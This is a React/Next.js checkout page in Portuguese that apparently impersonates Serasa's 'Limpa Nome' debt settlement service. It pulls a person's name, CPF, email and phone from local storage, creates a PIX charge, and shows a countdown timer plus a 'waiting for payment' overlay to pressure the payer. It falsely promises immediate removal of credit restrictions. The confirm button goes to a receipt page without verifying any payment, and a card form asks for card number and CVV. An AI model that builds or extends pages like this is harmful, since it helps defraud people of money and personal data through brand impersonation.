'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function Checkout() {
  const [method, setMethod] = useState('pix');
  const [discountedVal, setDiscountedVal] = useState(557.77);
  const [pixCode, setPixCode] = useState('Gerando código...');
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [timer, setTimer] = useState('05:00');
  const [isQrOverlayActive, setIsQrOverlayActive] = useState(false);
  const router = useRouter();

  useEffect(() => {
    const disc = parseFloat(localStorage.getItem('debt_discounted') || 557.77);
    setDiscountedVal(disc);
    generatePix(disc);
  }, []);

  const generatePix = async (amount) => {
    const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
    const amountCents = Math.round(amount * 100);

    try {
      const response = await fetch('/api/create-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: amountCents,
          customer: {
            name: userData.NOME || 'Cliente Serasa',
            email: userData.EMAIL || 'contato@exemplo.com',
            phone: userData.TELEFONE || '11999999999',
            document: {
              number: userData.CPF || '00000000000',
              type: 'CPF'
            }
          },
          items: [{
            title: 'Acordo Serasa Limpa Nome',
            unit_price: amountCents,
            quantity: 1,
            tangible: false
          }]
        })
      });

      const data = await response.json();

      if (data.pix) {
        setPixCode(data.pix.copy_paste);
        setQrCodeUrl(`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix.copy_paste)}`);
        
        setTimeout(() => setIsQrOverlayActive(true), 10000);
        startTimer(300);
      }
    } catch (error) {
      console.error('Error:', error);
      setPixCode('Erro ao gerar PIX. Tente novamente.');
    }
  };

  const startTimer = (duration) => {
    let t = duration;
    const interval = setInterval(() => {
      let m = parseInt(t / 60, 10);
      let s = parseInt(t % 60, 10);
      setTimer(`${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`);
      if (--t < 0) clearInterval(interval);
    }, 1000);
  };

  const copyPix = () => {
    navigator.clipboard.writeText(pixCode).then(() => {
      alert('Código PIX copiado com sucesso!');
    });
  };

  return (
    <div className="bg-light min-h-screen">
      <header className="acordo-header">
        <div className="container text-center">
          <h3 className="mt-2 text-xl font-bold" style={{ color: 'var(--secondary-color)' }}>Finalizar Regularização de CPF</h3>
        </div>
      </header>

      <main className="container max-w-xl py-8">
        <div className="card p-6">
          <div className="text-center mb-8">
            <p className="text-muted">Total a pagar:</p>
            <h2 className="text-4xl font-bold" style={{ color: 'var(--secondary-color)' }}>
              {discountedVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}
            </h2>
          </div>

          <div className="payment-methods mb-8">
            <div className={`method-card ${method === 'pix' ? 'active' : ''}`} onClick={() => setMethod('pix')}>
              <div className="method-info">
                <h4>PIX Automático</h4>
                <p>Liberação imediata das restrições e atualização do score no sistema.</p>
              </div>
              <div className="method-badge">RECOMENDADO</div>
            </div>
            <div className={`method-card ${method === 'card' ? 'active' : ''}`} onClick={() => setMethod('card')}>
              <div className="method-info">
                <h4>Cartão de Crédito</h4>
                <p>Regularize seu débito em até 12x com baixa garantida.</p>
              </div>
            </div>
          </div>

          {method === 'pix' && (
            <div className="pix-area active">
              <div className="pix-timer mb-4">Esta chave expira em <span>{timer}</span></div>
              <div className="qr-code-wrapper mb-6">
                <div className="qr-code">
                  {qrCodeUrl && <img src={qrCodeUrl} alt="QR Code PIX" />}
                </div>
                {isQrOverlayActive && (
                  <div className="qr-overlay active">
                    <span>Aguardando Pagamento...</span>
                  </div>
                )}
              </div>
              <p className="text-center small text-muted mb-2">Clique abaixo para copiar o código PIX:</p>
              <div className="copy-box mb-6" onClick={copyPix}>{pixCode}</div>
              <button className="btn-primary w-full py-4 btn-pulse" onClick={() => router.push('/comprovante')}>
                CONFIRMAR PAGAMENTO AGORA
              </button>
            </div>
          )}

          {method === 'card' && (
            <div className="card-area active">
              <div className="flex flex-col gap-4">
                <div className="form-group">
                  <label>Número do Cartão</label>
                  <input type="text" placeholder="0000 0000 0000 0000" />
                </div>
                <div className="flex gap-4">
                  <div className="form-group flex-1">
                    <label>Validade</label>
                    <input type="text" placeholder="MM/AA" />
                  </div>
                  <div className="form-group flex-1">
                    <label>CVV</label>
                    <input type="password" placeholder="***" maxLength="3" />
                  </div>
                </div>
                <button className="btn-primary w-full py-4">PROCESSAR PAGAMENTO SEGURO</button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
